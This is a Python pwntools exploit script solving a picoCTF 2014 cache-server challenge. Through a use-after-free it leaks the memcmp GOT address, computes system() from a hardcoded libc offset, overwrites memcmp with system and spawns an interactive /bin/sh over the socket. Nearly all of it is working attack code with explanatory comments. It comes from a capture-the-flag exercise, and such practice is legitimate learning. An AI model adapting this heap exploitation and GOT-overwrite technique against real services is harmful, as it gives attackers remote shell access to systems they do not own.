#!/usr/bin/python
from pwn import *
import socket
import telnetlib
"""
The original client has a pack4/unpack4 method that takes a 32 bit integer
and returns a 4 byte string representing the number in little endian.
With pwntools you have already access to the standard struct.pack and struct.unpack 
functions as well as support for packing/unpacking arbitrary-width integers.
"""

CACHE_GET = 0
CACHE_SET = 1

kNotFound = 0x0
kFound = 0x1
kCacheFull = 0x2

def write_string(f, s):
    # Packs an 32-bit integer
    f.write(p32(len(s)))
    f.write(s)

def read_string(f):
    # Unpacks a 32-bit integer
    size = u32(f.read(4))
    return f.read(size)

def cache_get(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kNotFound:
        return None
    assert status == kFound

    return read_string(f)

# We need this modified function, because once we hit system('/bin/sh'),
# there will be no more data sent back in the way that the original 
# function expects. This causes it to b0rk.
def cache_get2(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)

def cache_set(f, key, value, lifetime):
    f.write(chr(CACHE_SET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kCacheFull:
        return False
    assert status == kFound

    write_string(f, value)
    f.write(p32(lifetime))
    return True

###settings
local = True

s = socket.socket()

if not local:
    target = 'vuln2014.picoctf.com'
    port = 4548
else:
    target = 'localhost'
    port = 1337

s.connect((target, port))
log.info('Target: %s' % target)

f = s.makefile('rw', bufsize=0)

# It's useful to pause the client right after connecting so that you can
# attach to the server with gdb if desired.
# raw_input()

# Command to be executed later, once we've overwritten memcmp@plt.
cmd = '/bin/sh\x00'

# Add an entry to the cache; we will use this command later to spawn the shell. 
cache_set(f, cmd, "payload", 1000)

# Add an entry with a negative lifetime. This will fool cache_lookup, because it only checks for zero:
'''
    // Skip expired cache entries.
    if (entry->lifetime == 0) {
      continue;
    }
'''
cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)

# Request that value, causing it to be deleted from cache
cache_get(f, 'keyAAAA')

'''
// This is how the string struct looks like:
struct string {
  size_t length;
  size_t capacity;
  char *data;
};
'''
# Now, we request the value of a key called '\x04\x00\x00\x00\x00\x00\x00\..."
# but this is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)),
# because malloc will re-use this address.
# Leak memcmp address @ 0x804b014
cache_get(f, p32(4)+p32(4)+p32(0x804b014))

# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
# We supply the address of 'printf', so the check will pass & we read whatever is at value->data
cache_get(f, p32(6)+p32(6)+p32(0x8048310))

# Grab memcmp address:
addr_memcmp = u32(cache_get(f, 'printf'))
log.info("Leaking memcmp address: %s", hex(addr_memcmp))

# Calculate system address:
if local:
    # This hardcode address works for Ubuntu 12.04, libc v. 2.15
    offset = 0x000f2b70
else:
    # Does not work anymore :(
    offset = 0x142870 + 0x40100

log.info("Subtracting offset: %s", hex(offset))
addr_system = addr_memcmp - offset

log.info("Calculated system address: %s", hex(addr_system))

# Now we have to overwrite memcmp @ 0x804b014. The hints say we can do this with cache_set. 
# We'd love to abuse our old cache entry again, but alas, the memory regions have again been 
# freed(), due to cache_get seeing a lifetime <= 0.
# We'll restore them, so we can abuse them again to write to 0x804b014.

cache_get(f, p32(4)+p32(4)+p32(0x804b014))
cache_get(f, p32(6)+p32(0)+p32(0x8048310))

log.info("Attempting to overwrite memcmp pointer...")
assert cache_set(f, 'printf', p32(addr_system), 1)

log.info("Running {} on remote box".format(cmd))
log.info(cache_get2(f, cmd))


t = telnetlib.Telnet()
t.sock = s
log.info('Connection established')
t.interact()